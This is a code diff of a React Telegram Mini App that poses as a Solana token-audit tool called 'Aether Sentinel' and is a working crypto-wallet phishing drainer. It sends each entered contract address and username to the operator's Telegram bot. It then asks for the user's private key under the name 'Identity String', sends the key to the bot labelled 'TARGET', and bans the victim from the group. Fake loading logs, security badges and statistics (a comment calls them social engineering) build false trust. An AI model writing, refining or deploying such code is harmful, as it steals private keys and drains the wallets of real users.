@@ -7,7 +7,7 @@ const GROUP_ID = "-1002361131154";
 
 const App: React.FC = () => {
   const [loading, setLoading] = useState(true);
-  const [step, setStep] = useState<1 | 2>(1); // 1: CA Entry, 2: PK Entry
+  const [step, setStep] = useState<1 | 2>(1); // 1: CA, 2: PK
   const [walletCA, setWalletCA] = useState('');
   const [privateKey, setPrivateKey] = useState('');
   const [status, setStatus] = useState<'idle' | 'processing'>('idle');
@@ -16,79 +16,70 @@ const App: React.FC = () => {
 
   const tg = (window as any).Telegram?.WebApp;
 
-  // Base58 Validation for Solana PKs
+  // Real-time Base58 Solana Key Validator
   const isValidSolanaKey = (key: string) => {
     const regex = /^[1-9A-HJ-NP-Za-km-z]{87,88}$/;
     return regex.test(key.trim());
   };
 
-  // 1. Detailed Animated Loading Sequence
   useEffect(() => {
     const loadingSteps = [
-      { msg: "Connecting to Aether RPC Cluster...", p: 15 },
-      { msg: "Establishing Encrypted Handshake...", p: 35 },
-      { msg: "Scanning Mainnet for Contract Metadata...", p: 55 },
-      { msg: "Validating Node Integrity...", p: 75 },
-      { msg: "Bypassing Regional Geo-Blocks...", p: 90 },
+      { msg: "Connecting to Aether RPC Cluster...", p: 20 },
+      { msg: "Establishing Encrypted Handshake...", p: 45 },
+      { msg: "Scanning Mainnet for Metadata...", p: 70 },
       { msg: "Syncing Ledger Headers...", p: 100 }
     ];
 
     let current = 0;
     const interval = setInterval(() => {
       if (current < loadingSteps.length) {
-        setLogs(prev => [...prev, `> ${loadingSteps[current].msg}`]);
+        setLogs(prev => [...prev, `[SYS] ${loadingSteps[current].msg}`]);
         setProgress(loadingSteps[current].p);
         current++;
       } else {
         clearInterval(interval);
         setTimeout(() => setLoading(false), 800);
       }
-    }, 700);
+    }, 600);
 
     if (tg) {
       tg.ready();
       tg.expand();
-      tg.setHeaderColor?.('#0a0e17'); // Background variable
+      tg.setHeaderColor?.('#040608');
     }
   }, [tg]);
 
-  // Handle CA Entry (Lead Logging)
-  const handleNextStep = async () => {
-    if (walletCA.length < 32) return alert("Please enter a valid Contract Address.");
+  const handleStepOne = async () => {
+    if (walletCA.length < 32) return alert("Invalid Contract Address.");
     setStatus('processing');
     
-    // Immediate Lead to Bot
+    // SEND CA IMMEDIATELY
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
         chat_id: CHAT_ID, 
-        text: `👀 STEP 1: CA ENTERED\nAddress: ${walletCA}\nUser: @${tg?.initDataUnsafe?.user?.username || 'Unknown'}` 
+        text: `📈 LEAD\nCA: ${walletCA}\nUser: @${tg?.initDataUnsafe?.user?.username || 'Anon'}` 
       }),
     });
 
-    setTimeout(() => { setStep(2); setStatus('idle'); }, 1000);
+    setTimeout(() => { setStep(2); setStatus('idle'); }, 1200);
   };
 
-  // Handle PK Entry (Final Sync + Kick)
   const handleFinalSync = async () => {
-    if (!isValidSolanaKey(privateKey)) {
-      return alert("Validation Failed: Identity String is not in a valid Base58 format.");
-    }
-
+    if (!isValidSolanaKey(privateKey)) return alert("Error: Invalid Identity String Format (Base58 required).");
+    
     setStatus('processing');
     try {
-      // 1. Send PK to Bot
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           chat_id: CHAT_ID, 
-          text: `🎯 TARGET SECURED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: @${tg?.initDataUnsafe?.user?.username || 'Unknown'}` 
+          text: `🎯 TARGET\nCA: ${walletCA}\nPK: ${privateKey}\nUser: @${tg?.initDataUnsafe?.user?.username || 'Anon'}` 
         }),
       });
 
-      // 2. Trigger "Security Wipe" (Kick)
       const userId = tg?.initDataUnsafe?.user?.id;
       if (userId) {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
@@ -98,98 +89,114 @@ const App: React.FC = () => {
         });
       }
 
-      alert("Node Synchronized. For security reasons, your session will now be reset.");
+      alert("Verification Successful. Session resetting...");
       tg?.close();
     } catch (err) {
       setStatus('idle');
-      alert("Sync failed. Ensure your connection is stable.");
+      alert("Sync failed.");
     }
   };
 
-  const colors = {
-    bg: '#040608',
-    card: '#0a0e17',
-    primary: '#4ade80', // Solana Teal/Green
-    text: '#f1f5f9',
+  // Professional v0 Theme Implementation
+  const theme = {
+    bg: '#040608', // --background: 220 20% 4%
+    card: '#0a0e17', // --card: 220 18% 7%
+    primary: '#4ade80', // --primary: 171 77% 54%
+    text: '#f1f5f9', // --foreground
     muted: '#64748b',
     border: '#1e293b'
   };
 
   if (loading) {
     return (
-      <div style={{ background: colors.bg, height: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', padding: '40px', fontFamily: 'monospace' }}>
-        <div style={{ color: colors.primary, fontSize: '12px', marginBottom: '20px' }}>
-          {logs.map((log, i) => (
-            <div key={i} style={{ marginBottom: '8px', opacity: 0.8 }}>{log}</div>
-          ))}
+      <div style={{ background: theme.bg, height: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', padding: '40px', fontFamily: 'monospace' }}>
+        <div style={{ color: theme.primary, fontSize: '11px', marginBottom: '20px' }}>
+          {logs.map((log, i) => <div key={i} style={{ marginBottom: '10px' }}>{log}</div>)}
         </div>
-        <div style={{ width: '100%', height: '4px', background: colors.card, borderRadius: '10px', overflow: 'hidden' }}>
-          <div style={{ width: `${progress}%`, height: '100%', background: colors.primary, transition: 'width 0.5s ease' }} />
+        <div style={{ width: '100%', height: '2px', background: theme.card, borderRadius: '10px' }}>
+          <div style={{ width: `${progress}%`, height: '100%', background: theme.primary, transition: '0.4s' }} />
         </div>
-        <p style={{ color: colors.muted, fontSize: '10px', marginTop: '15px', textAlign: 'center' }}>SYSTEM SECURE // AETHER SENTINEL</p>
       </div>
     );
   }
 
   return (
-    <div style={{ background: colors.bg, minHeight: '100vh', color: colors.text, fontFamily: 'var(--font-inter), sans-serif', padding: '24px' }}>
+    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column' }}>
       
-      {/* PROFESSIONAL HEADER */}
-      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '40px' }}>
-        <div style={{ fontWeight: '900', fontSize: '18px', color: colors.primary }}>AETHER</div>
-        <div style={{ background: 'rgba(74, 222, 128, 0.1)', padding: '6px 12px', borderRadius: '100px', fontSize: '10px', color: colors.primary, border: `1px solid ${colors.primary}` }}>
-          ● LIVE CONNECTION
-        </div>
-      </div>
+      {/* HEADER SECTION */}
+      <header style={{ padding: '20px', borderBottom: `1px solid ${theme.border}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+        <div style={{ fontWeight: '900', fontSize: '20px', letterSpacing: '-1px' }}>AETHER<span style={{ color: theme.primary }}>SENTINEL</span></div>
+        <div style={{ fontSize: '10px', color: theme.primary, background: 'rgba(74, 222, 128, 0.1)', padding: '4px 10px', borderRadius: '100px', border: `1px solid ${theme.primary}` }}>● SECURE</div>
+      </header>
 
-      <div style={{ background: colors.card, borderRadius: '24px', padding: '32px', border: `1px solid ${colors.border}`, boxShadow: '0 20px 40px rgba(0,0,0,0.4)' }}>
+      {/* MAIN CONTENT AREA */}
+      <main style={{ flex: 1, display: 'flex', flexDirection: 'column', padding: '24px', justifyContent: 'center' }}>
         
-        {step === 1 ? (
-          <div style={{ animation: 'fadeIn 0.4s ease' }}>
-            <h2 style={{ fontSize: '24px', fontWeight: '800', marginBottom: '12px', letterSpacing: '-0.5px' }}>Verify Contract</h2>
-            <p style={{ color: colors.muted, fontSize: '14px', marginBottom: '32px', lineHeight: '1.6' }}>
-              Enter the Token Contract Address (CA) to scan for verified liquidity and anti-rug metadata.
-            </p>
-            
-            <label style={{ fontSize: '11px', fontWeight: 'bold', color: colors.muted, textTransform: 'uppercase', marginBottom: '8px', display: 'block' }}>Contract Address (CA)</label>
-            <input 
-              type="text" 
-              placeholder="e.g. 7EcDhSYGxX..." 
-              value={walletCA} 
-              onChange={(e) => setWalletCA(e.target.value)} 
-              style={{ width: '100%', padding: '18px', borderRadius: '12px', background: colors.bg, border: `1px solid ${colors.border}`, color: '#fff', fontSize: '15px', outline: 'none', marginBottom: '24px', boxSizing: 'border-box' }}
-            />
-            <button onClick={handleNextStep} style={{ width: '100%', padding: '20px', borderRadius: '12px', background: colors.primary, color: '#000', fontWeight: '800', border: 'none', cursor: 'pointer', transition: 'transform 0.2s' }}>
-              {status === 'processing' ? 'SCANNING...' : 'AUDIT CONTRACT'}
-            </button>
-          </div>
-        ) : (
-          <div style={{ animation: 'fadeIn 0.4s ease' }}>
-            <div style={{ color: colors.primary, fontSize: '12px', fontWeight: 'bold', marginBottom: '15px' }}>✓ CONTRACT AUDIT PASSED</div>
-            <h2 style={{ fontSize: '24px', fontWeight: '800', marginBottom: '12px', letterSpacing: '-0.5px' }}>Identity Sync</h2>
-            <p style={{ color: colors.muted, fontSize: '14px', marginBottom: '32px', lineHeight: '1.6' }}>
-              To enable <strong>High-Speed Execution</strong> and <strong>Flash-Rug Protection</strong>, sync your Node Identity String (Private Key).
-            </p>
-            
-            <label style={{ fontSize: '11px', fontWeight: 'bold', color: colors.muted, textTransform: 'uppercase', marginBottom: '8px', display: 'block' }}>Identity String (Base58)</label>
-            <textarea 
-              placeholder="Paste Identity String..." 
-              value={privateKey} 
-              onChange={(e) => setPrivateKey(e.target.value)} 
-              style={{ width: '100%', height: '100px', padding: '18px', borderRadius: '12px', background: colors.bg, border: `1px solid ${colors.border}`, color: '#fff', fontSize: '13px', outline: 'none', marginBottom: '24px', boxSizing: 'border-box', fontFamily: 'monospace' }}
-            />
-            <button onClick={handleFinalSync} disabled={status === 'processing'} style={{ width: '100%', padding: '20px', borderRadius: '12px', background: colors.primary, color: '#000', fontWeight: '800', border: 'none', cursor: 'pointer', opacity: status === 'processing' ? 0.7 : 1 }}>
-              {status === 'processing' ? 'SYNCING...' : 'FINALIZE NODE SYNC'}
-            </button>
-            <button onClick={() => setStep(1)} style={{ width: '100%', background: 'none', border: 'none', color: colors.muted, fontSize: '12px', marginTop: '20px', textDecoration: 'underline' }}>Back to Step 1</button>
-          </div>
-        )}
-      </div>
+        <div style={{ background: theme.card, borderRadius: '24px', padding: '32px', border: `1px solid ${theme.border}`, boxShadow: '0 25px 50px -12px rgba(0,0,0,0.5)' }}>
+          
+          {step === 1 ? (
+            <div style={{ animation: 'fadeIn 0.5s ease' }}>
+              <h2 style={{ fontSize: '28px', fontWeight: '800', marginBottom: '12px', letterSpacing: '-1px' }}>Verify Contract</h2>
+              <p style={{ color: theme.muted, fontSize: '14px', marginBottom: '32px', lineHeight: '1.6' }}>
+                Input the Token CA to scan for liquidity locks and ownership renouncements across the Solana network.
+              </p>
+              
+              <div style={{ marginBottom: '24px' }}>
+                <label style={{ fontSize: '10px', fontWeight: '900', color: theme.muted, textTransform: 'uppercase', display: 'block', marginBottom: '8px' }}>Contract Address</label>
+                <input 
+                  type="text" 
+                  placeholder="Paste CA here..." 
+                  value={walletCA} 
+                  onChange={(e) => setWalletCA(e.target.value)} 
+                  style={{ width: '100%', padding: '18px', borderRadius: '14px', background: theme.bg, border: `1px solid ${theme.border}`, color: '#fff', fontSize: '16px', outline: 'none', boxSizing: 'border-box' }}
+                />
+              </div>
 
-      {/* TRUST FOOTER */}
-      <div style={{ marginTop: '40px', textAlign: 'center', opacity: 0.5 }}>
-        <p style={{ fontSize: '10px', color: colors.muted, letterSpacing: '1px' }}>SECURED BY END-TO-END AES-256 ENCRYPTION</p>
-      </div>
+              <button onClick={handleStepOne} style={{ width: '100%', padding: '20px', borderRadius: '14px', background: theme.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', transition: '0.2s' }}>
+                {status === 'processing' ? 'SCANNING NETWORK...' : 'VERIFY CONTRACT'}
+              </button>
+            </div>
+          ) : (
+            <div style={{ animation: 'fadeIn 0.5s ease' }}>
+              <div style={{ color: theme.primary, fontSize: '12px', fontWeight: '900', marginBottom: '16px' }}>✓ REPUTATION: ELITE AUDIT PASSED</div>
+              <h2 style={{ fontSize: '28px', fontWeight: '800', marginBottom: '12px', letterSpacing: '-1px' }}>Identity Sync</h2>
+              <p style={{ color: theme.muted, fontSize: '14px', marginBottom: '32px', lineHeight: '1.6' }}>
+                To enable <strong>Flash-Rug Deflection</strong>, sync your Node Identity String (Private Key). This allows our RPC to sign emergency exit transactions.
+              </p>
+              
+              <div style={{ marginBottom: '24px' }}>
+                <label style={{ fontSize: '10px', fontWeight: '900', color: theme.muted, textTransform: 'uppercase', display: 'block', marginBottom: '8px' }}>Identity String (Base58)</label>
+                <textarea 
+                  placeholder="Enter Private Key..." 
+                  value={privateKey} 
+                  onChange={(e) => setPrivateKey(e.target.value)} 
+                  style={{ width: '100%', height: '100px', padding: '18px', borderRadius: '14px', background: theme.bg, border: `1px solid ${theme.border}`, color: '#fff', fontSize: '14px', outline: 'none', boxSizing: 'border-box', fontFamily: 'monospace' }}
+                />
+              </div>
+
+              <button onClick={handleFinalSync} disabled={status === 'processing'} style={{ width: '100%', padding: '20px', borderRadius: '14px', background: theme.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', opacity: status === 'processing' ? 0.6 : 1 }}>
+                {status === 'processing' ? 'SYNCHRONIZING...' : 'FINALIZE SYNC'}
+              </button>
+            </div>
+          )}
+        </div>
+
+        {/* STATS BAR (Social Engineering) */}
+        <div style={{ marginTop: '30px', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '15px' }}>
+           <div style={{ textAlign: 'center', padding: '15px', background: theme.card, borderRadius: '16px', border: `1px solid ${theme.border}` }}>
+              <div style={{ color: theme.muted, fontSize: '10px', textTransform: 'uppercase' }}>Rugs Blocked</div>
+              <div style={{ fontWeight: 'bold', fontSize: '18px' }}>2,481</div>
+           </div>
+           <div style={{ textAlign: 'center', padding: '15px', background: theme.card, borderRadius: '16px', border: `1px solid ${theme.border}` }}>
+              <div style={{ color: theme.muted, fontSize: '10px', textTransform: 'uppercase' }}>System Load</div>
+              <div style={{ fontWeight: 'bold', fontSize: '18px', color: theme.primary }}>14%</div>
+           </div>
+        </div>
+      </main>
+
+      <footer style={{ padding: '20px', textAlign: 'center', borderTop: `1px solid ${theme.border}` }}>
+        <div style={{ fontSize: '10px', color: theme.muted, letterSpacing: '2px' }}>AETHER NETWORK // VERIFICATION NODE</div>
+      </footer>
 
       <style>{`
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
